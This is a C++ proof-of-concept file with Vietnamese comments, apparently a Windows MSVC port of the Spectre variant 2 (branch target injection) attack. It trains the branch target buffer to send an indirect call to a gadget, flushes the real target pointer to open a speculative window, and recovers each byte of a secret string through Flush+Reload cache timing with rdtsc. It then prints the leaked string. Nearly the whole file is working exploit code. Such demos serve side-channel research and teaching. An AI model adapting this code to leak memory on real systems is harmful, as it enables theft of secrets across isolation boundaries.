#include <iostream>
#include <intrin.h>
#include <windows.h>

#pragma intrinsic(__rdtscp)
#pragma optimize("", off)

#define CACHE_HIT_THRESHOLD 80
#define GAP 512

// Căn chỉnh bộ nhớ tiêu chuẩn Cache Line (64 bytes) để chống nhiễu Prefetcher
__declspec(align(64)) uint8_t channel[256 * GAP];

// Khai báo dưới dạng mảng để nằm cùng phân vùng bộ nhớ đệm hợp lệ
__declspec(align(64)) char secret_buffer[] = "The Magic Words are Squeamish Ossifrage.";

typedef int (*TargetFunc)(const char*);
TargetFunc target_ptr;

// Hàm Độc hại (Gadget) - Nơi BTB sẽ lừa CPU nhảy vào
int gadget(const char* addr) {
    return channel[(unsigned char)(*addr) * GAP];
}

// Hàm An toàn - Mục tiêu kiến trúc hợp pháp
int safe_target(const char* addr) {
    return 42;
}

// Khối kích hoạt rẽ nhánh gián tiếp
int victim(const char* addr_to_read) {
    // Vòng lặp đóng băng và đồng bộ hóa Lịch sử rẽ nhánh (BHB - Branch History Buffer)
    int junk = 0;
    for (int i = 1; i <= 100; i++) {
        junk += i;
    }

    // Điểm nóng: Rẽ nhánh gián tiếp (call qword ptr [target_ptr])
    int result = target_ptr(addr_to_read);

    return result & junk;
}

void readByte(const char* addr_to_read, char result[2], int score[2]) {
    int hits[256] = { 0 };
    int tries, i, j, k, mix_i, junk = 0;
    uint64_t start, elapsed;
    uint8_t* addr;
    char dummyChar = '$';

    for (i = 0; i < 256; i++) {
        channel[i * GAP] = 1;
    }

    for (tries = 999; tries > 0; tries--) {
        // BƯỚC 1: HUẤN LUYỆN (Tẩy não bộ đệm BTB)
        target_ptr = &gadget;
        _mm_mfence();
        for (j = 50; j > 0; j--) {
            junk ^= victim(&dummyChar);
        }
        _mm_mfence();

        // Xóa sạch dấu vết mảng dò
        for (i = 0; i < 256; i++) _mm_clflush(&channel[i * GAP]);
        _mm_mfence();

        // BƯỚC 2: GÀI BẪY (Chuyển về đích an toàn và làm trễ con trỏ)
        target_ptr = &safe_target;
        _mm_mfence();
        _mm_clflush(&target_ptr);
        _mm_mfence();
        _mm_lfence(); // <--- RÀO CẢN BẮT BUỘC CHỐNG LỆNH RE-ORDER

        // BƯỚC 3: KÍCH NỔ ĐẦU CƠ
        junk ^= victim(addr_to_read);
        _mm_mfence();

        // BƯỚC 4: THU HOẠCH KÊNH KỀ (Flush+Reload)
        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255; // Bước nhảy giả ngẫu nhiên chống bước tiến
            addr = &channel[mix_i * GAP];

            _mm_lfence();
            start = __rdtsc();
            _mm_lfence();

            junk ^= *addr;

            _mm_lfence();
            elapsed = __rdtsc() - start;
            _mm_lfence();

            if (elapsed <= CACHE_HIT_THRESHOLD) hits[mix_i]++;
        }

        // Tìm 2 ứng cử viên có số phiếu hit cao nhất
        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || hits[i] >= hits[j]) { k = j; j = i; }
            else if (k < 0 || hits[i] >= hits[k]) { k = i; }
        }
        if (hits[j] >= 2 * hits[k] + 5 || (hits[j] == 2 && hits[k] == 0)) break;
    }

    hits[0] ^= junk;
    result[0] = (char)j; score[0] = hits[j];
    result[1] = (char)k; score[1] = hits[k];
}

int main() {
    std::cout << "=== SPECTRE V2: BTB POISONING (WINDOWS MSVC PORT - OPTIMIZED) ===\n\n";
    char total[1024] = { 0 }; // Khởi tạo mảng rỗng chứa tối đa 1024 ký tự
    int vitri = 0;
    char result[2];
    int score[2];
    int len = strlen(secret_buffer);
    const char* addr = secret_buffer;

    std::cout << "Reading " << len << " bytes starting at " << (void*)addr << ":\n";
    while (--len >= 0) {
        std::cout << "reading " << (void*)addr << "... ";
        readByte(addr++, result, score);
        std::cout << (score[0] >= 2 * score[1] ? "success -> " : "unclear -> ");
        std::cout << "0x" << std::hex << (int)(unsigned char)result[0] << " = '"
            << (char)((result[0] > 31 && result[0] < 127) ? result[0] : '?')
            << "' " << std::dec << "(score: " << score[0] << ")\n";



        if (result[0] > 31 && result[0] < 127) {
            total[vitri] = result[0];
        }
        else {
            total[vitri] = '_';
        }
        vitri++;
    }

    std::cout << "\n";
    total[vitri] = '\0';
    printf("\n======================================================\n");
    printf("Full strings leak : %s\n", total);
    printf("======================================================\n");


    system("pause");
    return 0;
}